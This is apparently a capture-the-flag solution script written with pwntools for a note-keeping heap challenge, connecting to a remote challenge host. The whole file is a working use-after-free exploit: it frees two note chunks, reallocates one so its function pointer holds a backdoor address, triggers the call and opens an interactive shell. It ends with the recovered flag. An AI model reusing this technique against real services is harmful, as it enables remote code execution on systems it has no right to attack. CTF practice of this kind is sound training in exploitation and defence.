from pwn import *

DEBUG = 0

if DEBUG:
    sh = process('backdoor')
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
else:
    sh = remote('p007.cc', 7777)
    context.log_level = 'info'


def add(size, content):
    sh.sendlineafter('Your choice :', '1')
    sh.sendlineafter('Note size :', str(size))
    sh.sendlineafter('Content :', content)


def delete(index):
    sh.sendlineafter('Your choice :', '2')
    sh.sendlineafter('Index :', str(index))


def myprint(index):
    sh.sendlineafter('Your choice :', '3')
    sh.sendlineafter('Index :', str(index))


# gdb.attach(sh)
add(16, 'A' * 15)
add(8, 'A' * 7)
delete(1)
delete(0)
shell_addr = 0x80489e9
add(8, p32(shell_addr))
myprint(1)
sh.interactive()

flag{rage_your_dream}
